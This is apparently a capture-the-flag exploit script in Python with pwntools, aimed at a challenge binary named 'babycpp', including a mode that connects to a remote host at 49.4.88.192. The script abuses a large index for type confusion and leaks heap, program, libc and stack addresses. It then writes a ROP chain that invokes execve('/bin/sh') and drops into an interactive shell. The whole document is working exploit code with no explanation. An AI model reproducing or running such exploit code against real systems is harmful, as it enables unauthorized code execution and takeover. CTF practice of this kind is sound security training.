from pwn import *
import sys
context.arch = 'amd64'
stat = sys.argv[1]

if stat == 'l':
	libc = ELF("/lib/x86_64-linux-gnu/libc-2.27.so")
elif stat == 'd' or stat == 'r':
	libc = ELF("./libc-2.27.so")
else:
	info("GG")
	exit()

def ch(c):
	io.sendlineafter("choice:",str(c))
def newA(t):
	ch(0)
	ch(str(t))
def seeA(h,i,f = False,ff = False):
	ch(1)
	io.sendafter("hash:",h)
	if(ff == False):
		if(f == True):
			io.send("\n")
		else:	
			io.sendlineafter("idx:",str(i))
	else:
		return
def setA(h,i,data,t = 2,isNew = False,len = 0):
	ch(2)
	io.sendafter("hash:",h)
	io.sendlineafter("idx:",str(i))
	if(t == 2):
		if(isNew == True):
			io.sendlineafter("obj:",str(len))
		io.sendafter("content:",data)
	else:
		io.sendlineafter("val:",data)
def chgA(h,i,nh):
	ch(3)
	io.sendafter("hash:",h)
	io.sendlineafter("idx:",str(i))
	io.sendafter("hash:",nh)
while True:
	try:
		if (stat == 'l'):
			io = process("./babycpp")
			#context.log_level = "debug"
		elif (stat == 'd'):
			io = process("./babycpp",env = {"LD_PRELOAD":"./libc-2.27.so"})
			#context.log_level = "debug"
		elif (stat == 'r'):
			io = remote('49.4.88.192',31771)
		else:
			info("STAT ERROR")
			exit()
		newA(2) #0
		newA(1)	#1
		newA(2)	#2
		newA(1)	#3
		setA(p32(0x1),0,str(0x4141),t = 1)
		setA(p32(0x0),0,'BBBB',t = 2,isNew = True,len = 0x8)
		setA(p32(0x0),1,'CCCC',t = 2,isNew = True,len = 0x8)
		chgA(p32(0x0),0x80000000,'\xe0\x8c')
		seeA(p32(0x0),0)
		io.recvuntil("the array is ")
		heap_base = int(io.recv(12),16)-(0x561c4be27170-0x561c4be15000)
		info("HEAP BASE -> %#x"%heap_base)
		setA(p32(0x1),0,hex(heap_base+(0x561c4be26f68-0x561c4be15000))[2:],t=1)
		setA(p32(0x1),1,hex(heap_base+(0x56040c0d7e70-0x56040c0c6000))[2:],t=1)
		chgA(p32(0x1),0x80000000,'\x00\x8d')
		seeA(p32(0x1),0)
		io.recvuntil("Content:")
		proc_base = u64(io.recv(6).ljust(8,'\x00'))-0x201ce0
		info("PROC BASE -> %#x"%proc_base)
		newA(2)	#4
		setA(p32(0x3),0,hex(heap_base+(0x5631cb24f0e8-0x5631cb23d000))[2:],t=1)
		setA(p32(0x3),1,hex(proc_base+0x201fd0)[2:],t=1)
		chgA(p32(0x3),0x80000000,'\x00\x8d')
		seeA(p32(0x3),0)
		io.recvuntil("Content:")
		libc_base = u64(io.recv(6).ljust(8,'\x00'))-libc.sym['puts']
		info("LIBC BASE -> %#x"%libc_base)
		newA(1)	#5
		newA(2)	#6
		newA(1)	#7
		newA(2)	#8
		setA(p32(0x5),0,hex(heap_base+(0x55b0706e72f0-0x55b0706d5000))[2:],t=1)
		setA(p32(0x5),2,hex(libc_base+libc.sym['environ'])[2:],t=1)
		chgA(p32(0x5),0x80000000,'\x00\x8d')
		seeA(p32(0x5),0)
		io.recvuntil('Content:')
		stack = u64(io.recv(6).ljust(8,'\x00'))-0xf8
		info("STACK RBP -> %#x"%stack)
		setA(p32(0x7),0,hex(heap_base+(0x55d1a11fb470-0x55d1a11e9000))[2:],t=1)
		setA(p32(0x7),1,"0068732f6e69622f",t=1)
		setA(p32(0x7),2,hex(stack+8)[2:],t=1)
		setA(p32(0x7),3,"48",t=1)
		'''
		setA(p32(0x7),4,hex(heap_base+(0x55d1a11fb488-0x55d1a11e9000))[2:],t=1)
		setA(p32(0x7),5,hex(stack+0x10)[2:],t=1)
		setA(p32(0x7),6,"8",t=1)
		setA(p32(0x7),7,hex(heap_base+(0x55d1a11fb470-0x55d1a11e9000))[2:],t=1)
		setA(p32(0x7),8,hex(stack+8)[2:],t=1)
		setA(p32(0x7),9,"8",t=1)
		'''
		chgA(p32(0x7),0x80000000,'\x00\x8d')
		pay = p64(proc_base+0x1693)+p64(heap_base+(0x55d1a11fb468-0x55d1a11e9000))
		pay += p64(libc_base+0x23e6a)+p64(0)
		pay += p64(libc_base+0x1b96)+p64(0)
		pay += p64(libc_base+0x439c8)+p64(0x3b)
		pay += p64(libc_base+0xd2975)
		setA(p32(0x7),0,pay)
		'''
		raw_input()
		setA(p32(0x5),4,p64(0x71)+p64(0)*4+"/bin/sh\x00",t=2)
		gdb.attach(io)
		ch(2)
		io.sendafter("hash:",p32(0x6))
		io.sendlineafter("idx:","9")
		io.sendlineafter("obj:","255")
		'''
		io.interactive()
	except Exception:
		io.close()
		info(str(Exception))
		continue
